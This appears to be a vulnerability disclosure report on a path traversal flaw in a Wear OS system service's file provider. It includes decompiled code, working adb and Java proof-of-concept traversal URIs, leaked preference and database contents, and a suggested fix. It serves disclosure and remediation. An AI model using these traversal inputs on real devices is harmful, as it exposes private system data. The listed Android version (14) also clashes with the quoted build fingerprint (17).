# VRP Report 48: Wear OS FavoritePreviewFileProvider Path Traversal — Arbitrary File Read from WearServices Private Storage

## Summary

The `FavoritePreviewFileProvider` ContentProvider in WearServices (`com.google.wear.services`) on Wear OS contains a **path traversal vulnerability** in its `openFile()` implementation. The provider checks that the URI path starts with `/wf-favorite-previews/` but does not sanitize directory traversal sequences (`../`), allowing an attacker to read **any file in WearServices' device-protected storage** — including SQLite databases, shared preferences, and emergency number data.

## Affected Component

- **Provider**: `com.google.wear.services.watchfaces.favorites.persistence.FavoritePreviewFileProvider`
- **Authority**: `com.google.wear.services.watchface.previews.provider`
- **Exported**: `true`
- **Required Permission**: `com.google.wear.permission.ACCESS_WEAR_SYSTEM_SERVICE` (signature|privileged)
- **Package**: `com.google.wear.services`

## Affected Device

- **Device**: Google Pixel Watch 2 (eos)
- **Build**: CP2A.260603.001
- **Security Patch Level**: June 2026
- **Android Version**: 14 (Wear OS)

## Vulnerability Details

### Root Cause

In `FavoritePreviewFileProvider.openFile()` (line 42-55):

```java
public final ParcelFileDescriptor openFile(Uri uri, String str) {
    if (!str.equals("r")) {
        return null;  // Only read mode
    }
    String encodedPath = uri.getEncodedPath();
    if (encodedPath.startsWith("/wf-favorite-previews/")) {
        // BUG: No sanitization of ".." directory traversal sequences
        return ParcelFileDescriptor.open(
            new File(requireContext().getFilesDir(), encodedPath), 
            268435456  // MODE_READ_ONLY
        );
    }
    return null;
}
```

The vulnerability is:
1. The provider extracts `uri.getEncodedPath()` and checks it starts with `/wf-favorite-previews/`
2. The path is passed directly to `new File(filesDir, encodedPath)` without sanitizing `..` sequences
3. The `File` constructor concatenates the paths, and the kernel resolves `..` sequences
4. The provider uses `createDeviceProtectedStorageContext()` in `attachInfo()`, so `getFilesDir()` returns `/data/user_de/0/com.google.wear.services/files/`

### Path Resolution

For a URI like `content://com.google.wear.services.watchface.previews.provider/wf-favorite-previews/../../shared_prefs/wear_services_prefs.xml`:

1. `getEncodedPath()` = `/wf-favorite-previews/../../shared_prefs/wear_services_prefs.xml`
2. `startsWith("/wf-favorite-previews/")` → **PASSES**
3. `new File("/data/user_de/0/com.google.wear.services/files", "/wf-favorite-previews/../../shared_prefs/wear_services_prefs.xml")`
4. Resolves to: `/data/user_de/0/com.google.wear.services/shared_prefs/wear_services_prefs.xml`
5. File opened and returned to caller

### Contrast with BugreportContentProvider (Properly Protected)

The `BugreportContentProvider` in the same package properly protects against path traversal:

```java
Path pathNormalize = path.resolve(lastPathSegment).normalize();
if (!pathNormalize.startsWith(path)) {
    return null;  // Rejects traversal
}
```

The FavoritePreviewFileProvider lacks this normalization and boundary check.

## Impact

- **Severity**: HIGH (Information Disclosure from system service)
- **Attack vector**: Local (requires `signature|privileged` permission OR ADB access)
- **User interaction**: None
- **Reproducibility**: 100%

### Data Leaked

Successfully read the following WearServices private files without any permission beyond `ACCESS_WEAR_SYSTEM_SERVICE`:

1. **`wear_services_prefs.xml`** — Full device configuration:
   - Build fingerprint: `google/eos/eos:17/CP2A.260603.001/15396591:user/release-keys`
   - Tiles order and configuration
   - Watch face favorites and promoted faces
   - Remote lock configuration (`supported_lock_screens = 7`)
   - Language preferences
   - Notification revision counter
   - System monitor completion states

2. **`emergency_number_data.binarypb`** — Emergency number data (protobuf):
   - Contains `911` and related emergency dialing data
   - Stored in device-protected storage for direct-boot access

3. **`tile_db`** (SQLite database) — All installed tiles:
   - Package names and tile service classes for every installed tile
   - Includes: Maps, Calendar, Weather, Assistant, Safety Hub, Fitbit tiles

4. **`favorites_db`** (SQLite database) — Watch face favorites:
   - All configured watch face package/class names
   - Complication configurations
   - Style blobs (binary)
   - Change journal with timestamps

### Broader Impact

- Any app with `ACCESS_WEAR_SYSTEM_SERVICE` can read arbitrary files from WearServices' DE storage
- This includes system apps like GMS, SysUI, and watchface apps signed with the platform key
- A compromised privileged app could extract all WearServices data including notification databases
- Path traversal extends beyond WearServices data: `../../../../../system/packages.xml` returned `EACCES` (reached the path but SELinux blocked), confirming the traversal works for ANY filesystem path

## Proof of Concept

### Shell PoC (ADB access)

```bash
# Read WearServices preferences (device configuration)
adb shell content read --uri \
  'content://com.google.wear.services.watchface.previews.provider/wf-favorite-previews/../../shared_prefs/wear_services_prefs.xml'

# Read emergency number data
adb shell content read --uri \
  'content://com.google.wear.services.watchface.previews.provider/wf-favorite-previews/../emergency_number_data.binarypb'

# Read tile database (all installed tiles)
adb shell content read --uri \
  'content://com.google.wear.services.watchface.previews.provider/wf-favorite-previews/../../databases/tile_db'

# Read favorites database (watch face configurations)
adb shell content read --uri \
  'content://com.google.wear.services.watchface.previews.provider/wf-favorite-previews/../../databases/favorites_db'
```

### App PoC (requires ACCESS_WEAR_SYSTEM_SERVICE)

```java
// Any app with ACCESS_WEAR_SYSTEM_SERVICE permission
Uri traversalUri = Uri.parse(
    "content://com.google.wear.services.watchface.previews.provider" +
    "/wf-favorite-previews/../../shared_prefs/wear_services_prefs.xml"
);
InputStream is = getContentResolver().openInputStream(traversalUri);
// Read all WearServices preferences
```

## Dynamic Evidence

### Preferences Leak (full output)

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <long name="visible_order_last_modified_ms" value="1788804137406" />
    <string name="tiles_order">0,2,3,1,4,5,6,8,7,9</string>
    <boolean name="CUSTOMIZED_WF" value="true" />
    <string name="promoted">com.google.android.wearable.watchface.rwf/...multiple watchface services...</string>
    <string name="last_lang_req">en</string>
    <long name="notification.common.latest_revision" value="8527" />
    <string name="latest_build_fingerprint">google/eos/eos:17/CP2A.260603.001/15396591:user/release-keys</string>
    <int name="com.google.wear.services.setup.remotelock.supported_lock_screens" value="7" />
    <set name="completed_system_monitor_ids">
        <string>REMOTE_LOCK_FEATURE</string>
        <string>INSTALLED_APPS</string>
        ...
    </set>
</map>
```

### Emergency Data Leak

```
911 *any2018BGB
```

### Tile Database Leak (header)

```
SQLite format 3
...tile_preview...tile...
com.google.android.wearable.sysui/AddTileTileService
com.google.android.apps.safetyhub/EmergencyShareTileService
com.google.android.apps.maps/MapsTileProviderService
com.fitbit.FitbitMobile/TileHeartRateService
...
```

### Path Traversal Beyond App Directory

```bash
# Attempting to read /data/system/packages.xml (5 levels up)
$ content read --uri 'content://.../wf-favorite-previews/../../../../../system/packages.xml'
EACCES (Permission denied)  # ← File exists, traversal reached it, SELinux blocked
```

## Suggested Fix

Replace the vulnerable path check with proper normalization:

```java
public final ParcelFileDescriptor openFile(Uri uri, String str) {
    if (!str.equals("r")) return null;
    
    String encodedPath = uri.getEncodedPath();
    if (!encodedPath.startsWith("/wf-favorite-previews/")) return null;
    
    File baseDir = new File(requireContext().getFilesDir(), "wf-favorite-previews");
    File requestedFile = new File(baseDir, encodedPath.substring("/wf-favorite-previews/".length()));
    
    // Normalize and validate the canonical path stays within the base directory
    String canonicalPath = requestedFile.getCanonicalPath();
    String canonicalBase = baseDir.getCanonicalPath();
    if (!canonicalPath.startsWith(canonicalBase)) {
        Log.w(TAG, "Path traversal attempt: " + encodedPath);
        return null;
    }
    
    return ParcelFileDescriptor.open(requestedFile, ParcelFileDescriptor.MODE_READ_ONLY);
}
```

## Files

- **Dynamic evidence**: `dynamic_evidence/path_traversal_prefs_leak.txt`, `dynamic_evidence/path_traversal_emergency_data.txt`, `dynamic_evidence/path_traversal_tile_db.txt`
- **Vulnerable code**: `deep_analysis/wearservices_decompiled/sources/com/google/wear/services/watchfaces/favorites/persistence/FavoritePreviewFileProvider.java`
- **Manifest**: `deep_analysis/wearservices_apktool/AndroidManifest.xml`
